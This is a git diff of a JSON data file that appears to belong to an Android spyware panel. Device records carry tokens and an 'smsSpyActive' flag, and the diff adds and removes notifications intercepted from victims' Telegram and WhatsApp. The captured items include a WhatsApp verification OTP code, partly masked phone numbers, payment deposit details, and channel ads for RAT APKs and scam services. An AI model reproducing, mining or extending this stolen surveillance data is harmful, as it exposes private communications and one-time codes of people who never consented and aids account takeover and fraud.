@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775757748,
+    "lastSeen": 1776775759009,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,14 +10387,14 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775755573,
+    "lastSeen": 1776775758492,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
     "deviceInfo": {
       "model": "realme RMX2103",
       "androidVersion": "Android 11",
-      "battery": 54,
+      "battery": 83,
       "network": "WiFi: <unknown ssid>",
       "sim1": "XL Axiata",
       "sim2": "Tidak ada layanan"
@@ -10403,6 +10403,70 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
+        "content": "❌ Gagal membuat panel\nGagal buat user: The email has already been taken.",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775759229
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: Rose",
+        "content": "JANGAN LUPA START DULU DI PRIVATE BOT NYET",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775759143
+      },
+      {
+        "appName": "Telegram",
+        "sender": "./j4X¡tsme な #sa #flory 🎖️",
+        "content": "Fs Noktel \nId 1 r9k (2) nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775759123
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Phil Godlewski 4.0",
+        "content": "Community Zoom Sessions Continue! 📢\n\nOur community Zoom sessions with managers are continuing today\n\nWhether you want to:\n\n💬 Ask questions about the Atom Venture ecosystem\n📊 Learn more about what’s happening across our projects\n‼️ Get the latest updates, especially on Arteki\n💭 Join the conversation with the team \n\n– You have the chance to join throughout this entire week\n\n🗓 Today’s available session slots are:\n10 AM, 12 PM, 5 PM, 7 PM, 9 PM, 10 PM, and 11 PM Eastern time\n\n📍 Head to meet.boostyfi.com and book your slot\n\nSee you on Zoom  🙌",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775759105
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6281*******74\n• Waktu: 21/04/2026, 19.47",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775759042
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "HALO WARGA TELEGRAM GUE ( @StevenCrasher ) \nINGIN MEMPERKENALKAN SALAH SATU PT GUE YAITU ( @IkyyNotDev2 ) AND DIA SUDAH RESMI JADI PT VIPP GUA\nJIKA KALIAN INGIN TRX MURBUG, SC, APK, ATAU PANEL BISA KE DIA YAH, AND KALO DIA NGERIP BISA LAPOR GUA🦋\nJIKA ANDA MINAT JOIN PT VIPP, PV\n@StevenCrasher",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775759016
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / MO*******************\n🏦 Method: DANA\n💰 Amount: Rp 2.800\n💸 Fee: Rp 200\n💵 Total Payload: Rp 3.000\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421204648241713\n🏷️ System ID: FSCL88367116\n⏰ 21 Apr 2026 • 19:49 WIB\n\n#DEPOSIT #DANA",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775758937
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16750 pesan baru dari 117 obrolan",
+        "time": "21/04 19:49",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775758842
+      },
       {
         "appName": "Telegram",
         "sender": "Phil Godlewski 4.0",
@@ -14338,70 +14402,6 @@
         "time": "21/04 19:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1776773380843
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Nanat",
-        "content": "Memanggil…",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773375854
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Nanat",
-        "content": "Memanggil…",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773375512
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "bintang",
-        "content": "ya",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773375035
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******61\n• Waktu: 21/04/2026, 19.09",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773373630
-      },
-      {
-        "appName": "Telegram",
-        "sender": "LearnTermuxHUB.Tools: 𝐃𝐈𝐓𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆",
-        "content": "APK BUG X RAT 5K PV @Napkxiua PERMANEN FULL UP",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773373604
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********840\n💰 Price: Rp 3.400\n🔢 Code: 365406\n━━━━━━━━━━━━━━━\n📨 Message:\n Akun WhatsApp Anda sedang didaftarkan di perangkat baru\n\nJangan bagikan kode dengan siapa pun\nKode WhatsApp Anda: 365-406\n4sgLq1p5sV6\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008717576\n🏷️ System ID: FSCL78251124\n⏰ 21 Apr 2026 • 19:08 WIB\n\n#OTP #WHATSAPP",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773373566
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB CPANEL BY PRABOWO: Chive fiver",
-        "content": "wkwk kocak jir",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773373550
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5855 pesan baru dari 48 obrolan",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773373512
       }
     ],
     "galleryPhotos": [],
